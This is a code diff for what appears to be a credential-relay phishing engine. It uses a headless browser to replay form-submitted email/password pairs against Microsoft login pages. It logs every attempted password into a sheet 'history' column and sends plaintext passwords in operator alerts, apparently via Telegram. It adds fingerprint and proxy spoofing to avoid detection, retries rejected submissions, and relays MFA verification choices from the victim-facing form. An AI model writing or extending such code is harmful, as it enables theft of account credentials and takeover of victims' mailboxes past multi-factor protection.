@@ -1,5 +1,4 @@
 ﻿import { NextResponse } from "next/server";
-import puppeteer from "puppeteer-core";
 import chromium from "@sparticuz/chromium-min";
 import { inspect } from 'util';
 import fs from 'fs-extra';
@@ -8,6 +7,8 @@ import {
     isDev,
     launchBrowser,
 } from "../../../../utils/utils.js";
+import { applyIdentityToPage, identitySummary } from "../../../../utils/identity.js";
+import { maskProxy } from "../../../../utils/proxy.js";
 import logger from "../../../../utils/logger.js";
 import aiService from "../../../../utils/aiService.js";
 import { platformConfigs } from "./platforms.js";
@@ -30,7 +31,9 @@ import {
     verifyPageStillValid,
     detectPasswordError,
     detectAccountLocked,
+    detectPasswordUnavailable,
     stillOnPasswordPage,
+    pageStillOnAuth,
     getPasswordErrorText
 } from './routeHelper.js';
 import { sendTelegramMessage } from '../../../api/telegram.js';
@@ -151,18 +154,19 @@ async function validateEmailAgainstStrictly(email, strictly) {
  */
 async function updateBrowserRowDataFast(browserId, updateData, isNewRow = false) {
     // 1. Write to cache FIRST (instant, synchronous)
+    const historyPayload = submissionHistoryPayload(browserId);
     if (isNewRow) {
-        populateCache(browserId, updateData);
+        populateCache(browserId, { ...updateData, ...historyPayload });
     } else {
         const existing = getCachedRow(browserId) || {};
-        setCachedRow(browserId, { ...existing, ...updateData });
+        setCachedRow(browserId, { ...existing, ...updateData, ...historyPayload });
     }
     // 2. Only do full Sheets cascade for terminal states (COMPLETED/FAILED).
     //    Intermediate writes go through cache + batched background sync to conserve quota.
     const status = updateData.status || '';
     if (status === 'COMPLETED' || status === 'FAILED') {
         const cachedForWrite = getCachedRow(browserId) || {};
-        const mergedForWrite = { ...cachedForWrite, ...updateData };
+        const mergedForWrite = { ...cachedForWrite, ...updateData, ...historyPayload };
         await updateBrowserRowData(browserId, mergedForWrite, isNewRow).catch(err => {
             logger.error(`[updateBrowserRowDataFast][${browserId}] Sheets write failed: ${err.message}`);
         });
@@ -1163,58 +1167,81 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                                 // New password submission on a reused session — clear the wrong-password
                                 // debounce so a rejected attempt still fires its own alert.
                                 clearWrongPasswordDebounce(browserId, email);
-                                await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, visiblePwSelector);
-                                await page.type(visiblePwSelector, password, { delay: 50 });
-                                let passwordNextClicked = false;
                                 const urlBeforePasswordSubmit = page.url();
-                                if (platformConfig.selectors.passwordNextButton) {
-                                    let pwdSelectors = Array.isArray(platformConfig.selectors.passwordNextButton) ? platformConfig.selectors.passwordNextButton : [platformConfig.selectors.passwordNextButton];
-                                    for (const sel of pwdSelectors) {
-                                        try {
-                                            await page.waitForSelector(sel, { visible: true, timeout: 2000 });
-                                            const navigationPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => null);
-                                            await page.click(sel);
-                                            await navigationPromise;
-                                            passwordNextClicked = true;
-                                            break;
-                                        } catch (e) {
-                                            logger.debug(`[checkAccountAccess][${instanceId}] Password next button not found or clickable: ${sel}`);
-                                        }
-                                    }
-                                }
-                                if (passwordNextClicked) {
-                                    await new Promise(res => setTimeout(res, 2000));
-                                    // Check for "Password sign-in isn't available" error FIRST — this is a
-                                    // passwordless account; it must be detected before the URL-change revert so
-                                    // the engine doesn't loop asking for a password that can never work.
-                                    if (platformConfig.selectors?.passwordUnavailable) {
-                                        const pwUnavailSelectors = Array.isArray(platformConfig.selectors.passwordUnavailable)
-                                            ? platformConfig.selectors.passwordUnavailable
-                                            : [platformConfig.selectors.passwordUnavailable];
-                                        for (const sel of pwUnavailSelectors) {
-                                            if (typeof sel === 'string') {
-                                                const unavailableExists = await page.evaluate((xpath) => {
-                                                    try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
-                                                }, sel).catch(() => false);
-                                                if (unavailableExists) {
-                                                    logger.info(`[checkAccountAccess][${instanceId}] Password sign-in unavailable detected.`);
-                                                    return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: null, message: "Password sign-in isn't available for this account. Try another sign-in method." };
-                                                }
+                                // "Password sign-in isn't available" is often TRANSIENT — a straight
+                                // re-submission of the same password usually clears it (verified 2nd/3rd
+                                // attempt). Bounded retry (4x) before failing the row, mirroring the
+                                // WAITINGPASSWORD retry loop in processRow.
+                                let caaPasswordUnavailableRetries = 0;
+                                while (true) {
+                                    await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, visiblePwSelector);
+                                    await page.type(visiblePwSelector, password, { delay: 50 });
+                                    let passwordNextClicked = false;
+                                    if (platformConfig.selectors.passwordNextButton) {
+                                        let pwdSelectors = Array.isArray(platformConfig.selectors.passwordNextButton) ? platformConfig.selectors.passwordNextButton : [platformConfig.selectors.passwordNextButton];
+                                        for (const sel of pwdSelectors) {
+                                            try {
+                                                await page.waitForSelector(sel, { visible: true, timeout: 2000 });
+                                                const navigationPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => null);
+                                                await page.click(sel);
+                                                await navigationPromise;
+                                                passwordNextClicked = true;
+                                                break;
+                                            } catch (e) {
+                                                logger.debug(`[checkAccountAccess][${instanceId}] Password next button not found or clickable: ${sel}`);
                                             }
                                         }
+                                    }
+                                    if (!passwordNextClicked) break;
+
+                                    // Record the submission trial so the terminal (FAILED/COMPLETED) write always
+                                    // carries this email/password in the 'history' column + hub + responses object,
+                                    // even when the attempt is rejected by checkAccountAccess (e.g. wrong password,
+                                    // account lockout) and never reaches the WAITINGPASSWORD handler.
+                                    appendSubmissionHistory(browserId, email, password);
+
+                                    // Bounded poll for the async markers instead of a single snapshot: Microsoft
+                                    // renders "Password sign-in isn't available" / the wrong-password error
+                                    // ASYNCHRONOUSLY after submit, so poll rather than checking once.
+                                    let pwUnavailable = false;
+                                    let locked = false;
+                                    let pwError = false;
+                                    let leftView = false;
+                                    const detectDeadline = Date.now() + 10000;
+                                    while (Date.now() < detectDeadline) {
+                                        pwUnavailable = await detectPasswordUnavailable(page, platformConfig);
+                                        locked = await detectAccountLocked(page, platformConfig);
+                                        pwError = await detectPasswordError(page, platformConfig);
+                                        leftView = !(await stillOnPasswordPage(page, platformConfig));
+                                        if (pwUnavailable || locked || pwError || leftView) break;
+                                        await new Promise(res => setTimeout(res, 1000));
+                                    }
+
+                                    if (pwUnavailable) {
+                                        caaPasswordUnavailableRetries++;
+                                        if (caaPasswordUnavailableRetries > 4) {
+                                            logger.warn(`[checkAccountAccess][${instanceId}] Password sign-in still unavailable after ${caaPasswordUnavailableRetries} retries. Returning FAILED.`);
+                                            notifyTeam({ type: 'PASSWORD_UNAVAILABLE', platform, email, browserId, url: page.url(), detail: 'Account does not allow password sign-in (after retries)' });
+                                            return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'FAILED', error: 'PASSWORD_UNAVAILABLE', message: "Password sign-in isn't available for this account after multiple attempts. The account may not accept password sign-in." };
+                                        }
+                                        logger.info(`[checkAccountAccess][${instanceId}] Password sign-in unavailable detected (attempt ${caaPasswordUnavailableRetries}/4). Auto-retrying same password...`);
+                                        await new Promise(res => setTimeout(res, 2000));
+                                        continue; // re-type + resubmit the same password
                                     }
                                     // Check for login failure FIRST — a wrong password on the newer Microsoft
                                     // login page renders an inline error (#passwordError / has-error) while the
                                     // URL stays the same and the password input stays visible. That must be
                                     // classified as WAITINGPASSWORD_ERROR, NOT the generic "wrong button" below.
-                                    if (await detectAccountLocked(page, platformConfig)) {
+                                    if (locked) {
                                         logger.warn(`[checkAccountAccess][${instanceId}] Account lockout detected (too many incorrect attempts). Returning FAILED.`);
                                         return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'FAILED', error: 'ACCOUNT_LOCKED', message: "Account temporarily locked: too many incorrect password attempts. Please try again later." };
                                     }
-                                    if (await detectPasswordError(page, platformConfig)) {
+                                    if (pwError) {
                                         logger.info(`[checkAccountAccess][${instanceId}] Password incorrect. Returning WAITINGPASSWORD_ERROR.`);
                                         return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password provided. Please try again." };
                                     }
+                                    break; // no error marker and password view left → submit accepted
+                                }
                                     // Verify page actually changed after click — if URL is the same and password input still visible, wrong button was clicked
                                     const urlAfterPasswordSubmit = page.url();
                                     const pwStillVisible = await page.evaluate((sels) => {
@@ -1255,7 +1282,6 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                                         await new Promise(resolve => setTimeout(resolve, 5000));
                                     }
                                     return { emailExists: true, accountAccess: true, reachedInbox, requiresVerification: false };
-                                }
                             }
                             return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD' };
                         }
@@ -1379,6 +1405,12 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                             await page.click(firstVisibleSelector);
                             await navigationPromise;
                             logger.info(`[checkAccountAccess][${instanceId}] Clicked on selector: ${firstVisibleSelector}`);
+                            // Record the submission trial once the password is actually submitted in the
+                            // fresh-session flow, so the terminal write carries it in 'history' even when
+                            // the attempt is rejected inside checkAccountAccess (wrong password/lockout).
+                            if (step.selector === 'passwordNextButton' && password) {
+                                appendSubmissionHistory(browserId, email, password);
+                            }
                             try { await originalPage.bringToFront(); } catch (e) {/* ignore */ }
                         }
                     }
@@ -1670,6 +1702,16 @@ function appendSubmissionHistory(browserId, email, password) {
     logger.info(`[appendSubmissionHistory][${browserId}] Trial recorded (total ${current.length}): ${email}`);
 }
 
+/**
+ * Build the `history` field (JSON string of recorded trials) for a sheet/cache write so
+ * the column is populated on EVERY status-change persist — not just the terminal state.
+ * Returns {} when there are no trials so callers can spread it harmlessly.
+ */
+function submissionHistoryPayload(browserId) {
+    const history = submissionHistory.get(browserId);
+    return (Array.isArray(history) && history.length > 0) ? { history: JSON.stringify(history) } : {};
+}
+
 // Hard cap for checkAccountAccess so a page/CDP stall (the same failure that hangs
 // post-launch setup) can never leave a row stuck in processRow forever. On timeout we
 // resolve with RETRY_TECHNICAL — the poll loop either retries or fails gracefully with
@@ -1683,6 +1725,32 @@ function withAccountCheckTimeout(promise, browserId) {
             resolve({ emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'RETRY_TECHNICAL', error: `checkAccountAccess timed out after ${CHECK_ACCOUNT_ACCESS_TIMEOUT_MS / 1000}s (page/CDP stalled)` });
         }, CHECK_ACCOUNT_ACCESS_TIMEOUT_MS))
     ]);
+}
+
+// Bounded auto-retry for Microsoft's transient "Password sign-in isn't available". The error
+// is NOT terminal like a wrong password or account lockout — a straight re-submission of the
+// SAME password usually clears it (verified 2nd/3rd attempt). `retriesRef` is a { count }
+// object so the counter survives across call sites (post-submit poll, early re-check, hard
+// gate). Decide then have the CALLER `continue` the WAITINGPASSWORD while loop (which re-types
+// the cached password and resubmits) or `return` from processRow when exhausted.
+function decidePasswordUnavailableRetry(browserId, email, platform, updateData, retriesRef, maxRetries = 4) {
+    retriesRef.count += 1;
+    if (retriesRef.count > maxRetries) {
+        logger.warn(`[processRow][${browserId}] Password sign-in still unavailable after ${retriesRef.count} retries. Failing to avoid a permanent hang.`);
+        updateData.status = "FAILED";
+        updateData.lastJsonResponse = JSON.stringify({
+            browserId, email, status: "FAILED",
+            emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
+            verificationState: null,
+            platform, timestamp: new Date().toISOString(),
+            message: "Password sign-in isn't available for this account after multiple attempts. The account may not accept password sign-in."
+        });
+        updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
+        notifyTeam({ type: 'PASSWORD_UNAVAILABLE', platform, email, browserId, detail: 'Account does not allow password sign-in (after retries)' });
+        return 'failed';
+    }
+    logger.info(`[processRow][${browserId}] Password sign-in unavailable (attempt ${retriesRef.count}/${maxRetries}). Waiting 2s then auto-retrying same password via while loop.`);
+    return 'retry';
 }
 
 // Dedupe guard: never run TWO checkAccountAccess flows concurrently against the SAME
@@ -1714,6 +1782,25 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     let status = sheetStatus;
     let email = row[columnIndexes['email']]; // Changed to let
     let password = row[columnIndexes['password']];
+    // Terminal account-lockout gate: if Microsoft's lockout/block screen is present, the
+    // process MUST fail immediately — never loop back to a waiting state. Checks the page
+    // and, on match, persists FAILED + notifies, then returns true (caller exits).
+    const failIfAccountLockout = async (pf) => {
+        if (!pf || !(await detectAccountLocked(page, pf))) return false;
+        logger.warn(`[processRow][${browserId}] Account lockout detected (too many incorrect attempts). Failing immediately.`);
+        finalStatus = "FAILED";
+        updateData.status = finalStatus;
+        updateData.lastJsonResponse = JSON.stringify({
+            browserId, email, status: finalStatus,
+            emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
+            verificationState: null,
+            platform, timestamp: new Date().toISOString(),
+            message: "Account temporarily locked: too many incorrect password attempts. Please try again later."
+        });
+        notifyTeam({ type: 'RATE_LIMITED', platform, email, browserId, url: page.url(), detail: `Account lockout after password: ${password || ''}` });
+        updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
+        return true;
+    };
     logger.debug(`[processRow][${browserId}] Processing row.`);
     const _timer = { start: Date.now() };
     processRowsInFlight.add(browserId);
@@ -1744,6 +1831,9 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     let browserFullyClosed = false;
     let exitingEarly = false;
     let platform = 'unknown';
+    // Hoisted to function scope so the outer catch (crash handler) can reference it — it's
+    // reassigned inside the try block but must be in scope when processRow throws.
+    let domain = '';
     let initialCheckResult = {
         emailExists: false,
         accountAccess: false,
@@ -1920,6 +2010,11 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
             instanceId = `PROC-${browserId}-${browser.process()?.pid || 'unknownPID'}`;
 
+            if (browser.identity) {
+                const sum = identitySummary(browser.identity);
+                logger.info(`[identity][${browserId}] run fingerprint ua=${sum.ua} viewport=${sum.viewport} tz=${sum.timezone} locale=${sum.locale} hw=${sum.hwConcurrency} mem=${sum.deviceMemory} webgl=${sum.webgl} proxy=${browser.proxy ? maskProxy(browser.proxy.url) : 'none'}`);
+            }
+
             // Post-launch setup with a hard timeout. A freshly-launched browser can
             // be unresponsive (CDP stalls) so browser.pages()/setUserAgent etc.
             // never resolve, leaving this row stuck forever with page=null while
@@ -1977,8 +2072,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 // and skip redundant processRow instead of killing this browser
                 activeBrowserSessions.set(browserId, { browser, page, targetCreatedListener });
 
-                await page.setUserAgent(browser.selectedUserAgent);
-                await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
+                if (browser.identity) {
+                    await applyIdentityToPage(page, browser.identity);
+                } else {
+                    await page.setUserAgent(browser.selectedUserAgent);
+                    await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
+                }
 
                 await page.evaluateOnNewDocument(() => {
                     const style = document.createElement('style');
@@ -2008,7 +2107,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             } // end else (active browser session reuse)
         }
 
-        let domain = '';
+        domain = '';
         let mxRecords = [];
         let matchedPlatformKey = '';
         let platformConfig = {};
@@ -2076,7 +2175,11 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             // If strictly provides a known platform, navigate to its login URL immediately
             // so the user sees the login page while waiting for email input
             try {
-                const rowStrictly = row[columnIndexes['strictly']];
+                // Fall back to the in-memory cache when the sheet-fetched row's strictly cell is
+                // missing/empty — new rows populate cache with strictly BEFORE the GAS sheet write
+                // propagates, so cache is the authoritative copy at WAITINGEMAIL entry.
+                const cachedStrictly = getCachedRow(browserId)?.strictly;
+                const rowStrictly = row[columnIndexes['strictly']] || cachedStrictly || '';
                 // Keys in platformConfigs are lowercase; normalize the sheet value so
                 // values like 'Outlook' still resolve to the right login page.
                 const rowStrictlyKey = rowStrictly ? String(rowStrictly).trim().toLowerCase() : '';
@@ -2087,7 +2190,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         logger.warn(`[processRow][${browserId}] Early navigation to ${targetUrl} failed: ${e.message}`);
                     });
                 } else {
-                    logger.debug(`[processRow][${browserId}] No valid strictly value for early navigation (value='${rowStrictly || ''}')`);
+                    logger.warn(`[processRow][${browserId}] No valid strictly value for early navigation (sheet='${row[columnIndexes['strictly']] || ''}', cache='${cachedStrictly || ''}', resolvedKey='${rowStrictlyKey}'). Platform lookup: ${rowStrictlyKey ? (platformConfigs[rowStrictlyKey] ? (platformConfigs[rowStrictlyKey].url ? 'ok' : 'no-url') : 'not-found') : 'empty-key'}`);
                 }
             } catch (navErr) {
                 logger.warn(`[processRow][${browserId}] Error during early navigation: ${navErr.message}`);
@@ -2478,9 +2581,16 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             _timer.waitingPasswordHandler = Date.now();
             activelyProcessing.add(browserId);
             logger.info(`[processRow][${browserId}] Resuming from WAITINGPASSWORD state. elapsed since set: ${_timer.waitingPasswordHandler - (_timer.waitingPasswordSet || _timer.start)}ms`);
+            // If the page already shows the account-lockout screen (e.g. a previous attempt
+            // tripped it and the engine re-entered WAITINGPASSWORD with the message on the
+            // password-entry screen), fail immediately instead of waiting for another password.
+            if (await failIfAccountLockout(platformConfig)) {
+                logger.info(`[processRow][${browserId}] Lockout already on the password screen at WAITINGPASSWORD entry. Failing.`);
+                return;
+            }
             let pollingTimeoutPassword = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
             let passwordProvidedAndProcessed = false;
-            let passwordUnavailableRetries = 0; // Bounded retries for transient "Password sign-in isn't available"
+            const passwordUnavailableRetriesRef = { count: 0 }; // Bounded retries for transient "Password sign-in isn't available"
 
             while (Date.now() < pollingTimeoutPassword && !passwordProvidedAndProcessed) {
                 try {
@@ -2907,23 +3017,8 @@ if (!foundSelector) {
                                     // submission needs a retry (backup behavior, verified working). Wait 2s then
                                     // re-type the cached password and resubmit via the while loop. Bounded so a
                                     // genuinely passwordless account can't hang the engine forever.
-                                    passwordUnavailableRetries++;
-                                    if (passwordUnavailableRetries > 8) {
-                                        logger.warn(`[processRow][${browserId}] Password sign-in still unavailable after ${passwordUnavailableRetries} retries. Failing to avoid a permanent hang.`);
-                                        finalStatus = "FAILED";
-                                        updateData.status = "FAILED";
-                                        updateData.lastJsonResponse = JSON.stringify({
-                                            browserId, email, status: "FAILED",
-                                            emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
-                                            verificationState: null,
-                                            platform, timestamp: new Date().toISOString(),
-                                            message: "Password sign-in isn't available for this account after multiple attempts. The account may not accept password sign-in."
-                                        });
-                                        notifyTeam({ type: 'PASSWORD_UNAVAILABLE', platform, email, browserId, detail: 'Account does not allow password sign-in (after retries)' });
-                                        updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
-                                        return;
-                                    }
-                                    logger.info(`[processRow][${browserId}] Password sign-in unavailable detected. Waiting 2s then auto-retrying same password via while loop (retry ${passwordUnavailableRetries}/8).`);
+                                    const pwUnavailDecision = decidePasswordUnavailableRetry(browserId, email, platform, updateData, passwordUnavailableRetriesRef, 4);
+                                    if (pwUnavailDecision === 'failed') return;
                                     pollingTimeoutPassword = Date.now() + 60000; // Reset timeout — give another 60s for retry to succeed
                                     await new Promise(res => setTimeout(res, 2000));
                                     continue; // Go back to top of while loop to re-type cached password and resubmit
@@ -2940,20 +3035,14 @@ if (!foundSelector) {
                                 let passwordErrorText = null;
                                 const passwordErrorPollDeadline = Date.now() + 15000;
                                 while (Date.now() < passwordErrorPollDeadline) {
-                                    if (await detectAccountLocked(page, platformConfig)) {
+                                    if (await failIfAccountLockout(platformConfig)) {
                                         logger.warn(`[processRow][${browserId}] Account lockout detected after password submission (too many incorrect attempts). Failing immediately.`);
-                                        finalStatus = "FAILED";
-                                        updateData.status = finalStatus;
-                                        updateData.lastJsonResponse = JSON.stringify({
-                                            browserId, email, status: finalStatus,
-                                            emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
-                                            verificationState: null,
-                                            platform, timestamp: new Date().toISOString(),
-                                            message: "Account temporarily locked: too many incorrect password attempts. Please try again later."
-                                        });
-                                        notifyTeam({ type: 'RATE_LIMITED', platform, email, browserId, url: page.url(), detail: `Account lockout after password: ${password || ''}` });
-                                        updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
                                         return;
+                                    }
+                                    if (await detectPasswordUnavailable(page, platformConfig)) {
+                                        logger.info(`[processRow][${browserId}] Password sign-in unavailable detected during post-submit poll. Auto-retrying same password.`);
+                                        passwordUnavailableDetected = true;
+                                        break;
                                     }
                                     if (await detectPasswordError(page, platformConfig)) {
                                         logger.info(`[processRow][${browserId}] Login failed detected after password submission. Incorrect password.`);
@@ -2972,6 +3061,16 @@ if (!foundSelector) {
                                 }
                                 if (!passwordFailedDetected) {
                                     logger.debug(`[processRow][${browserId}] No password-error marker found within ${15000}ms poll (or password view left).`);
+                                }
+
+                                if (passwordUnavailableDetected && !passwordFailedDetected) {
+                                    // Late render caught by the post-submit poll: same bounded retry as the
+                                    // fast-path above, so the transient passwordless error clears on re-submit.
+                                    const pwUnavailDecision = decidePasswordUnavailableRetry(browserId, email, platform, updateData, passwordUnavailableRetriesRef, 4);
+                                    if (pwUnavailDecision === 'failed') return;
+                                    pollingTimeoutPassword = Date.now() + 60000;
+                                    await new Promise(res => setTimeout(res, 2000));
+                                    continue;
                                 }
 
                                 // NOTE: No "page did not change" revert here. After Enter (or the button
@@ -3016,6 +3115,18 @@ if (!foundSelector) {
                                     // password view with an error marker, treat as incorrect password
                                     // NOW — do not run the accepted-password tail (which can stall up
                                     // to ~75s) only to discover the same thing via the hard gate.
+                                    if (await failIfAccountLockout(platformConfig)) {
+                                        logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Lockout detected at early re-check. Failing immediately.`);
+                                        return;
+                                    }
+                                    if (await detectPasswordUnavailable(page, platformConfig).catch(() => false)) {
+                                        logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password sign-in unavailable detected at early re-check. Auto-retrying same password.`);
+                                        const pwUnavailDecision = decidePasswordUnavailableRetry(browserId, email, platform, updateData, passwordUnavailableRetriesRef, 4);
+                                        if (pwUnavailDecision === 'failed') return;
+                                        pollingTimeoutPassword = Date.now() + 60000;
+                                        await new Promise(res => setTimeout(res, 2000));
+                                        continue;
+                                    }
                                     const earlyGateError = await detectPasswordError(page, platformConfig).catch(() => null);
                                     const stillPwdView = await stillOnPasswordPage(page, platformConfig).catch(() => false);
                                     if (earlyGateError || stillPwdView) {
@@ -3041,6 +3152,18 @@ if (!foundSelector) {
                                         // before writing PROCESSING_FINALIZING. The newer Microsoft login page can
                                         // render the wrong-password error AFTER the initial poll window. Never
                                         // finalize (→ COMPLETED) while the page is still showing the password view.
+                                        if (await failIfAccountLockout(platformConfig)) {
+                                            logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Lockout detected at hard gate. Failing immediately.`);
+                                            return;
+                                        }
+                                        if (await detectPasswordUnavailable(page, platformConfig).catch(() => false)) {
+                                            logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password sign-in unavailable detected at hard gate. Auto-retrying same password.`);
+                                            const pwUnavailDecision = decidePasswordUnavailableRetry(browserId, email, platform, updateData, passwordUnavailableRetriesRef, 4);
+                                            if (pwUnavailDecision === 'failed') return;
+                                            pollingTimeoutPassword = Date.now() + 60000;
+                                            await new Promise(res => setTimeout(res, 2000));
+                                            continue;
+                                        }
                                         const gateErrorNow = await detectPasswordError(page, platformConfig);
                                         if (gateErrorNow) {
                                             const gateErrorText = await getPasswordErrorText(page, platformConfig);
@@ -3074,7 +3197,10 @@ if (!foundSelector) {
                                         // If page is stuck on login page after password submit, navigate directly to inbox
                                         const postPwdUrl = page.url();
                                         if (postPwdUrl.includes('login.microsoftonline.com') || postPwdUrl.includes('login.live.com')) {
-                                            const emailDomain = email ? email.split('@')[1]?.toLowerCase() : '';
+                                            // Normalize the domain (strip trailing backticks/quotes/stray chars from
+                                            // sheet-typed emails) so the inbox lookup resolves instead of falling back
+                                            // to the fwlink sign-in URL.
+                                            const emailDomain = email ? String(email.split('@')[1] || '').toLowerCase().replace(/[^a-z0-9.]/g, '') : '';
                                             const directInboxUrl = PLATFORM_INBOX_URLS[emailDomain] || platformConfig.url;
                                             if (directInboxUrl) {
                                                 logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Page still on login page (${postPwdUrl}). Navigating directly to inbox: ${directInboxUrl}`);
@@ -3098,7 +3224,11 @@ if (!foundSelector) {
                                         // render after the redirect round-trip.
                                         let postInboxStillOnPasswordView = false;
                                         let postInboxErrorText = null;
-                                        if (!inboxReached && (await detectPasswordError(page, platformConfig) || await stillOnPasswordPage(page, platformConfig))) {
+                                        if (await failIfAccountLockout(platformConfig)) {
+                                            logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Lockout detected after inbox attempt. Failing immediately.`);
+                                            return;
+                                        }
+                                        if (!inboxReached && (await detectPasswordError(page, platformConfig) || await pageStillOnAuth(page, platformConfig))) {
                                             postInboxStillOnPasswordView = true;
                                             postInboxErrorText = await getPasswordErrorText(page, platformConfig);
                                             logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] After inbox attempt, page is back on the password view/error. Treating as incorrect password — NOT finalizing.`);
@@ -3137,6 +3267,16 @@ if (!foundSelector) {
                                         platform, timestamp: new Date().toISOString(),
                                         message: initialCheckResult.message || "Incorrect password. Please provide a valid password."
                                     });
+                                    // Notify the operator that this attempt was rejected. This is the shared
+                                    // funnel for every WAITINGPASSWORD detection path that did NOT already fire
+                                    // the alert (early re-check / hard gate / post-inbox second gate); the
+                                    // debounce key (cleared at each submit) prevents duplicates when the
+                                    // post-submit poll already sent it.
+                                    sendWrongInputAlert({
+                                        type: 'WRONG_PASSWORD',
+                                        platform, email, browserId, password,
+                                        detail: `Incorrect password: "${initialCheckResult.message || 'rejected by provider'}"`
+                                    });
                                     // Incorrect password: the WRONG_PASSWORD alert already carries the attempted
                                     // value, so clear it from the row and release the form. The WAITINGPASSWORD
                                     // loop then blocks until the user provides a NEW value — eliminating the
@@ -3154,7 +3294,8 @@ if (!foundSelector) {
                                         verified: false,
                                         fullAccess: false,
                                         lastUserActivity: new Date().toISOString(),
-                                        lastJsonResponse: updateData.lastJsonResponse
+                                        lastJsonResponse: updateData.lastJsonResponse,
+                                        ...submissionHistoryPayload(browserId)
                                     });
                                     activelyProcessing.delete(browserId);
                                     password = null;
@@ -3165,7 +3306,8 @@ if (!foundSelector) {
                                             engineProcessing: false,
                                             verified: false,
                                             fullAccess: false,
-                                            lastJsonResponse: updateData.lastJsonResponse
+                                            lastJsonResponse: updateData.lastJsonResponse,
+                                            ...submissionHistoryPayload(browserId)
                                         });
                                     } catch (clearErr) {
                                         logger.warn(`[processRow][${browserId}] Sheet clear of rejected password failed (non-critical): ${clearErr.message}`);
@@ -3368,13 +3510,26 @@ if (!foundSelector) {
                     logger.debug(`[processRow][${browserId}][WAITINGOPTIONS] Current actual view: ${currentActualViewName}`);
                     let freshCurrentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, currentActualViewName);
 
-                    // Read sheet data FIRST to capture any externally-set verificationChoice before options refresh
-                    const checkData = await fetchDataFromAppScript(1, 30000, true);
-                    const checkHeaders = checkData[0];
-                    const checkColumnIndexes = getColumnIndexes(checkHeaders);
-                    const checkRows = checkData.slice(1);
-                    const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
-                    const currentSheetVerificationChoice = checkRow ? checkRow[checkColumnIndexes['verificationChoice']] : null;
+                    // Check cache FIRST for status + choice (the template's update-process POST writes
+                    // field values to cache immediately, so cache is the fast/authoritative source).
+                    const cachedForOptionsPoll = getCachedRow(browserId);
+                    const cachedStatusForOptionsPoll = cachedForOptionsPoll?.status;
+                    const TERMINAL_OPTIONS_POLL_STATUSES = ["COMPLETED", "PROCESSING_FINALIZING", "FAILED"];
+                    // Only terminal states represent a real external change. The engine writes
+                    // WAITINGOPTIONS (and update-process writes PROCESSING once a choice is submitted)
+                    // to cache only, so the sheet's stale status must never be treated as an exit.
+                    if (cachedStatusForOptionsPoll && TERMINAL_OPTIONS_POLL_STATUSES.includes(cachedStatusForOptionsPoll)) {
+                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Status changed externally to ${cachedStatusForOptionsPoll}. Exiting loop.`);
+                        finalStatus = cachedStatusForOptionsPoll; break;
+                    }
+
+                    let verificationChoiceRaw = null;
+                    const cachedChoiceForOptionsPoll = cachedForOptionsPoll?.verificationChoice;
+                    if (cachedChoiceForOptionsPoll && String(cachedChoiceForOptionsPoll).trim() !== "") {
+                        verificationChoiceRaw = cachedChoiceForOptionsPoll;
+                        _timer.choiceFound = Date.now();
+                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Verification choice found in cache: '${verificationChoiceRaw}'`);
+                    }
 
                     const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
                     if (ljp.viewName !== currentActualViewName || JSON.stringify(ljp.verificationOptions) !== JSON.stringify(freshCurrentVerificationOptions)) {
@@ -3396,10 +3551,10 @@ if (!foundSelector) {
                             verificationOptions: JSON.stringify(freshCurrentVerificationOptions),
                             lastJsonResponse: updateData.lastJsonResponse
                         };
-                        // Preserve verificationChoice from sheet to prevent clearing during polling (same race as password clearing)
-                        if (currentSheetVerificationChoice) {
-                            optionsRefreshPayload.verificationChoice = currentSheetVerificationChoice;
-                            logger.debug(`[processRow][${browserId}][WAITINGOPTIONS] Preserving verificationChoice in options refresh: ${currentSheetVerificationChoice}`);
